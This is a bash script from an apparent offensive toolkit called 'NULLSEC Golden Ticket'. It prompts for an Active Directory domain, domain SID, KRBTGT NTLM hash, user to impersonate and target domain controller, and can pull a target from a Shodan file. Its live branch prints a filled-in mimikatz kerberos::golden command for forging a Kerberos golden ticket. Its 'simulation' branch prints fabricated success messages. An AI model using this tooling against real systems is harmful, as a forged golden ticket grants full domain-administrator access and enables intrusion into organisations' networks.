#!/bin/bash
# NULLSEC Golden Ticket - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC GOLDEN TICKET ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Domain: '${RESET})" DOMAIN; [ -z "$DOMAIN" ] && DOMAIN="CORP.LOCAL"
read -p "$(echo -e ${WHITE}'  [>] Domain SID: '${RESET})" SID; [ -z "$SID" ] && SID="S-1-5-21-1234567890-1234567890-1234567890"
read -p "$(echo -e ${WHITE}'  [>] KRBTGT NTLM hash: '${RESET})" KRBTGT; [ -z "$KRBTGT" ] && KRBTGT="aad3b435b51404eeaad3b435b51404ee"
read -p "$(echo -e ${WHITE}'  [>] User to impersonate: '${RESET})" USER; [ -z "$USER" ] && USER="Administrator"
read -p "$(echo -e ${WHITE}'  [>] Target DC: '${RESET})" DC; [ -z "$DC" ] && DC="DC01.corp.local"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Forging Golden Ticket"
    echo ""
    echo -e "${DIM}[*] Generating TGT for $USER@$DOMAIN...${RESET}"; sleep 0.8
    echo -e "${GREEN}[+]${RESET} Domain: $DOMAIN"
    echo -e "${GREEN}[+]${RESET} SID: $SID"
    echo -e "${GREEN}[+]${RESET} User: $USER (RID 500)"
    echo -e "${GREEN}[+]${RESET} Groups: 512,513,518,519,520"
    echo ""
    echo -e "${DIM}[*] Encrypting with KRBTGT hash...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} Golden Ticket created!"
    echo ""
    echo -e "${DIM}[*] Injecting ticket into memory...${RESET}"; sleep 0.3
    echo -e "${GREEN}[+]${RESET} Ticket injected"
    echo -e "${GREEN}[+]${RESET} Accessing $DC..."
    echo -e "${GREEN}[+]${RESET} Access granted as $USER"
    echo ""
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Use mimikatz or Rubeus:"
    echo -e "${DIM}    mimikatz# kerberos::golden /domain:$DOMAIN /sid:$SID /krbtgt:$KRBTGT /user:$USER${RESET}"
fi
